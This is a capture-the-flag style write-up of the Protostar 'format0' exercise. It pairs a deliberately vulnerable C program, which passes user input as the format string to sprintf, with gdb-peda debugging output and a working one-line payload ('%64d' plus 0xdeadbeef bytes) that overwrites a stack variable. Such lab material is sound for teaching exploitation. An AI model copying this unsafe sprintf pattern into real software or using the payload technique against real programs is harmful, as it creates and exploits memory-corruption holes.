### Format0

* Source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
    volatile int target;
    char buffer[64];

    target = 0;

    sprintf(buffer, string);

    if(target == 0xdeadbeef) {
        printf("you have hit the target correctly :)\n");
    }
}

int main(int argc, char **argv)
{
    vuln(argv[1]);
}
```

* Solution

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0804842b <+0>:	push   ebp
   0x0804842c <+1>:	mov    ebp,esp
   0x0804842e <+3>:	and    esp,0xfffffff0
   0x08048431 <+6>:	sub    esp,0x10
   0x08048434 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048437 <+12>:	add    eax,0x4
   0x0804843a <+15>:	mov    eax,DWORD PTR [eax]
   0x0804843c <+17>:	mov    DWORD PTR [esp],eax
   0x0804843f <+20>:	call   0x80483f4 <vuln>
   0x08048444 <+25>:	leave  
   0x08048445 <+26>:	ret    
End of assembler dump.
gdb-peda$ disass vuln
Dump of assembler code for function vuln:
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	sub    esp,0x68
   0x080483fa <+6>:	mov    DWORD PTR [ebp-0xc],0x0
   0x08048401 <+13>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048404 <+16>:	mov    DWORD PTR [esp+0x4],eax
   0x08048408 <+20>:	lea    eax,[ebp-0x4c]
   0x0804840b <+23>:	mov    DWORD PTR [esp],eax
   0x0804840e <+26>:	call   0x8048300 <sprintf@plt>
   0x08048413 <+31>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048416 <+34>:	cmp    eax,0xdeadbeef
   0x0804841b <+39>:	jne    0x8048429 <vuln+53>
   0x0804841d <+41>:	mov    DWORD PTR [esp],0x8048510
   0x08048424 <+48>:	call   0x8048330 <puts@plt>
   0x08048429 <+53>:	leave  
   0x0804842a <+54>:	ret    
End of assembler dump.
gdb-peda$ b *vuln+31
Breakpoint 1 at 0x8048413: file format0/format0.c, line 15.
gdb-peda$ python 
>print("A"*60)
>end
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /root/Desktop/bin/format0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[----------------------------------registers-----------------------------------]
EAX: 0x3c ('<')
EBX: 0x0 
ECX: 0x0 
EDX: 0xffffd588 --> 0x5f534c00 ('')
ESI: 0xf7fa8000 --> 0x1d5d8c 
EDI: 0x0 
EBP: 0xffffd2e8 --> 0xffffd308 --> 0x0 
ESP: 0xffffd280 --> 0xffffd29c ('A' <repeats 60 times>)
EIP: 0x8048413 (<vuln+31>:	mov    eax,DWORD PTR [ebp-0xc])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048408 <vuln+20>:	lea    eax,[ebp-0x4c]
   0x804840b <vuln+23>:	mov    DWORD PTR [esp],eax
   0x804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
=> 0x8048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
   0x8048416 <vuln+34>:	cmp    eax,0xdeadbeef
   0x804841b <vuln+39>:	jne    0x8048429 <vuln+53>
   0x804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510
   0x8048424 <vuln+48>:	call   0x8048330 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd280 --> 0xffffd29c ('A' <repeats 60 times>)
0004| 0xffffd284 --> 0xffffd54c ('A' <repeats 60 times>)
0008| 0xffffd288 --> 0xf7ffd940 --> 0x0 
0012| 0xffffd28c --> 0xc2 
0016| 0xffffd290 --> 0x0 
0020| 0xffffd294 --> 0xc10000 
0024| 0xffffd298 --> 0x0 
0028| 0xffffd29c ('A' <repeats 60 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, vuln (string=0xffffd54c 'A' <repeats 60 times>) at format0/format0.c:15
15	format0/format0.c: No such file or directory.
gdb-peda$ x/10x $ebp-0xc
0xffffd2dc:	0x00000000	0x00000000	0xf7e02c3b	0xffffd308
0xffffd2ec:	0x08048444	0xffffd54c	0x00000000	0x0804846b
0xffffd2fc:	0x00000000	0xf7fa8000

gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /root/Desktop/bin/format0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA










[----------------------------------registers-----------------------------------]
EAX: 0x41 ('A')
EBX: 0x0 
ECX: 0x0 
EDX: 0xffffd588 --> 0x5f534c00 ('')
ESI: 0xf7fa8000 --> 0x1d5d8c 
EDI: 0x0 
EBP: 0xffffd2d8 --> 0xffffd2f8 --> 0x0 
ESP: 0xffffd270 --> 0xffffd28c ('A' <repeats 65 times>)
EIP: 0x8048413 (<vuln+31>:	mov    eax,DWORD PTR [ebp-0xc])
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048408 <vuln+20>:	lea    eax,[ebp-0x4c]
   0x804840b <vuln+23>:	mov    DWORD PTR [esp],eax
   0x804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
=> 0x8048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
   0x8048416 <vuln+34>:	cmp    eax,0xdeadbeef
   0x804841b <vuln+39>:	jne    0x8048429 <vuln+53>
   0x804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510
   0x8048424 <vuln+48>:	call   0x8048330 <puts@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd270 --> 0xffffd28c ('A' <repeats 65 times>)
0004| 0xffffd274 --> 0xffffd547 ('A' <repeats 65 times>)
0008| 0xffffd278 --> 0xf7ffd940 --> 0x0 
0012| 0xffffd27c --> 0xc2 
0016| 0xffffd280 --> 0x0 
0020| 0xffffd284 --> 0xc10000 
0024| 0xffffd288 --> 0x0 
0028| 0xffffd28c ('A' <repeats 65 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, vuln (string=0xffffd547 'A' <repeats 65 times>) at format0/format0.c:15
15	in format0/format0.c
gdb-peda$ x/10x $ebp-0xc
0xffffd2cc:	0x00000041	0x00000000	0xf7e02c3b	0xffffd2f8
0xffffd2dc:	0x08048444	0xffffd547	0x00000000	0x0804846b
0xffffd2ec:	0x00000000	0xf7fa8000
gdb-peda$ quit
root@kali:~/Desktop/bin# ./format0 $(python -c "print '%64d' + '\xef\xbe\xad\xde'")
you have hit the target correctly :)
root@kali:~/Desktop/bin# 
```
